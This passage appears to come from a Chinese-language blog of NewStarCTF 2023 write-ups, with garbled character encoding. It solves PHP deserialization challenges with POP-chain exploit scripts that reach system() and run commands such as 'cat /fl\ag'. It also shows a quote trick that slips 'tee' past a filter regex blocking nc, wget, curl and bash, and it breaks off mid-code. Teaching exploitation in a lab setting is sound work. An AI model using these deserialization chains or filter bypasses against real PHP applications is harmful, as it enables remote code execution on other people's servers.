class="" title="image-20250705095556099"><p>ååºåˆ—åŒ–åŠ rce</p><p>å®ä¾‹åŒ–å¯¹è±¡è§¦å‘ __destructä¹‹åå†è§¦å‘    tostring </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$a = new minipop;</span><br><span class="line">$b = new minipop;</span><br><span class="line">$b -&gt; qwejaskdjnlka=$a;</span><br></pre></td></tr></table></figure><p>é€šè¿‡å•å¼•å·ç»•è¿‡ç”¨teeå°†æŒ‡ä»¤æ‰§è¡Œç»“æœè¾“å‡º</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /flag_is_h3eeere | t&#x27;&#x27;ee 1</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">minipop</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>=<span class="string">&quot;cat /flag_is_h3eeere | t&#x27;&#x27;ee 1&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$qwejaskdjnlka</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\\$|\.|\!|\@|\#|\%|\^|\&amp;|\*|\?|\&#123;|\&#125;|\&gt;|\&lt;|nc|tee|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i&#x27;</span>, <span class="variable">$this</span>-&gt;code))&#123;</span><br><span class="line">            <span class="title function_ invoke__">exec</span>(<span class="variable">$this</span>-&gt;code);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;alright&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;qwejaskdjnlka;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;payload&#x27;</span>]))&#123;</span><br><span class="line">    <span class="comment">//wanna try?</span></span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;payload&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> minipop;</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> minipop;</span><br><span class="line"><span class="variable">$b</span> -&gt; qwejaskdjnlka=<span class="variable">$a</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> (<span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>));</span><br></pre></td></tr></table></figure><h1 id="NewStarCTF-2023-å…¬å¼€èµ›é“-POP-Gadget"><a href="#NewStarCTF-2023-å…¬å¼€èµ›é“-POP-Gadget" class="headerlink" title="[NewStarCTF 2023 å…¬å¼€èµ›é“]POP Gadget"></a>[NewStarCTF 2023 å…¬å¼€èµ›é“]POP Gadget</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Begin</span></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-zA-Z0-9]/&quot;</span>,<span class="variable">$this</span>-&gt;name))&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;Hello&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;Welcome to NewStarCTF 2023!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Then</span></span>&#123;</span><br><span class="line">  <span class="keyword">private</span> <span class="variable">$func</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    (<span class="variable language_">$this</span>-&gt;func)();</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Good Job!&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Handle</span></span>&#123;</span><br><span class="line">  <span class="keyword">protected</span> <span class="variable">$obj</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$vars</span></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;obj-&gt;<span class="title function_ invoke__">end</span>();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Super</span></span>&#123;</span><br><span class="line">  <span class="keyword">protected</span> <span class="variable">$obj</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;obj-&gt;<span class="title function_ invoke__">getStr</span>();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">end</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;==GAME OVER==&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CTF</span></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$handle</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">end</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="keyword">unset</span>(<span class="variable language_">$this</span>-&gt;handle-&gt;log);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">WhiteGod</span></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$func</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$var</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__unset</span>(<span class="params"><span class="variable">$var</span></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    (<span class="variable language_">$this</span>-&gt;func)(<span class="variable language_">$this</span>-&gt;<span class="keyword">var</span>);  </span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pop&#x27;</span>]);</span><br></pre></td></tr></table></figure><p>å‘ç°åœ¨whitegodä¸­å¯ä»¥è¿›è¡Œrce</p><p>æ„é€ popé“¾beginâ€”â€”&gt;thenâ€”-&gt;superâ€”-&gt;handleâ€”-&gt;ctfâ€”â€“&gt;whitegod</p><p>popé“¾</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Begin</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Then</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Handle</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$obj</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Super</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$obj</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CTF</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$handle</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">WhiteGod</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span>=<span class="string">&quot;system&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var</span>=<span class="string">&quot;ls /&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$pop</span>=<span class="keyword">new</span> <span class="title class_">Begin</span>();</span><br><span class="line"><span class="variable">$pop</span>-&gt;name=<span class="keyword">new</span> <span class="title class_">Then</span>();</span><br><span class="line"><span class="variable">$pop</span>-&gt;name-&gt;func=<span class="keyword">new</span> <span class="title class_">Super</span>();</span><br><span class="line"><span class="variable">$pop</span>-&gt;name-&gt;func-&gt;obj=<span class="keyword">new</span> <span class="title class_">Handle</span>();</span><br><span class="line"><span class="variable">$pop</span>-&gt;name-&gt;func-&gt;obj-&gt;obj=<span class="keyword">new</span> <span class="title function_ invoke__">CTF</span>();</span><br><span class="line"><span class="variable">$pop</span>-&gt;name-&gt;func-&gt;obj-&gt;obj-&gt;handle=<span class="keyword">new</span> <span class="title class_">WhiteGod</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$pop</span>);</span><br></pre></td></tr></table></figure><h1 id="NewStarCTF-2023-å…¬å¼€èµ›é“-More-Fast"><a href="#NewStarCTF-2023-å…¬å¼€èµ›é“-More-Fast" class="headerlink" title="[NewStarCTF 2023 å…¬å¼€èµ›é“]More Fast"></a>[NewStarCTF 2023 å…¬å¼€èµ›é“]More Fast</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Start</span></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$errMsg</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="variable language_">$this</span>-&gt;errMsg);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pwn</span></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$obj</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;obj-&gt;<span class="title function_ invoke__">evil</span>();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">evil</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Reverse</span></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$func</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$var</span></span>) </span>&#123;</span><br><span class="line">    (<span class="variable language_">$this</span>-&gt;func)();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Web</span></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$func</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$var</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">evil</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/i&quot;</span>,<span class="variable">$this</span>-&gt;<span class="keyword">var</span>))&#123;</span><br><span class="line">      (<span class="variable language_">$this</span>-&gt;func)(<span class="variable language_">$this</span>-&gt;<span class="keyword">var</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;Not Flag&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Crypto</span></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$obj</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$wel</span> = <span class="variable language_">$this</span>-&gt;obj-&gt;good;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;NewStar&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Misc</span></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">evil</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;good job but nothing&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = @<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;fast&#x27;</span>]);</span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;Nope&quot;</span>);</span><br></pre></td></tr></table></figure><p>æœ‰ä¸€ä¸ªgcå›æ”¶æœºåˆ¶ï¼Œæ‰€æœ‰è¦åœ¨è§¦å‘å‰åˆ©ç”¨dieæå‰åœæ­¢</p><p>å¦å¤–PHP çš„ç‰¹æ€§ï¼š<code>die(object)</code> ä¼šéšå¼è°ƒç”¨ <code>__toString()</code></p><p>cryptoä¸­æœ‰æœªçŸ¥å±æ€§goodä¼šè°ƒç”¨get</p><p>åœ¨cryptoä¸­ä¼šè°ƒç”¨å‡½æ•°è§¦å‘invoke</p><p>pwnä¸­çš„evilä¸ºwebä¸­çš„å¯¹è±¡</p><p>æ‰€æœ‰popé“¾åº”ä»startâ€”&gt;cryptoâ€”&gt;reverseâ€”&gt;pwnâ€”&gt;web</p><p>æœ€ç»ˆexp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Start</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$errMsg</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="variable language_">$this</span>-&gt;errMsg);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pwn</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$obj</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;obj-&gt;<span class="title function_ invoke__">evil</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">evil</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Reverse</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$var</span></span>) </span>&#123;</span><br><span class="line">        (<span class="variable language_">$this</span>-&gt;func)();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Web</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span>=<span class="string">&#x27;system&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var</span>=<span class="string">&#x27;cat /fl\ag&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">evil</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/i&quot;</span>,<span class="variable">$this</span>-&gt;<span class="keyword">var</span>))&#123;</span><br><span class="line">            (<span class="variable language_">$this</span>-&gt;func)(<span class="variable language_">$this</span>-&gt;<span class="keyword">var</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Not Flag&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Crypto</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$obj</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$wel</span> = <span class="variable language_">$this</span>-&gt;obj-&gt;good;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;NewStar&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Misc</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">evil</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;good job but nothing&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$Start</span> = <span class="keyword">new</span> <span class="title class_">Start</span>();</span><br><span class="line"><span class="variable">$web</span> = <span class="keyword">new</span> <span class="title class_">Web</span>();</span><br><span class="line"><span class="variable">$pwn</span> = <span class="keyword">new</span> <span class="title class_">Pwn</span>();</span><br><span class="line"><span class="variable">$crypto</span> = <span class="keyword">new</span> <span class="title class_">Crypto</span>();</span><br><span class="line"><span class="variable">$reverse</span> = <span class="keyword">new</span> <span class="title class_">Reverse</span>();</span><br><span class="line"><span class="variable">$misc</span> = <span class="keyword">new</span> <span class="title class_">Misc</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$Start</span>-&gt;errMsg=<span class="variable">$crypto</span>;</span><br><span class="line"><span class="variable">$crypto</span>-&gt;obj=<span class="variable">$reverse</span>;</span><br><span class="line"><span class="variable">$reverse</span>-&gt;func=<span class="variable">$pwn</span>;</span><br><span class="line"><span class="variable">$pwn</span>-&gt;obj=<span class="variable">$web</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$Start</span>);</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯ä¸ç†è§£ä¸ºä»€ä¹ˆè¦å°†payloadæœ€åçš„}åˆ å»</p><h1 id="NewStarCTF-2023-å…¬å¼€èµ›é“-é€ƒ"><a href="#NewStarCTF-2023-å…¬å¼€èµ›é“-é€ƒ" class="headerlink" title="[NewStarCTF 2023 å…¬å¼€èµ›é“]é€ƒ"></a>[NewStarCTF 2023 å…¬å¼€èµ›é“]é€ƒ</h1><p>å­—ç¬¦ä¸²å¢å¤šçš„é€ƒé€¸é¢˜ç›®</p><?phphighlight_file(__FILE__);function waf($str){  return str_replace("bad","good",$str);}class GetFlag {  public $key;  public $cmd = "whoami";  public function __construct($key)  {    $this->key = $key;  }  public function __destruct()  {    system($this->cmd);  }}unserialize(waf(serialize(new GetFlag($_GET['key']))));åˆ©ç”¨æ›¿æ¢å¢åŠ çš„ä¸€ä¸ªå­—ç¬¦æ„é€ æŒ‡ä»¤å°†è¶Šæ¥çš„è¸¢å‡ºå»<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;bad&quot;</span>,<span class="string">&quot;good&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GetFlag</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$key</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span> = <span 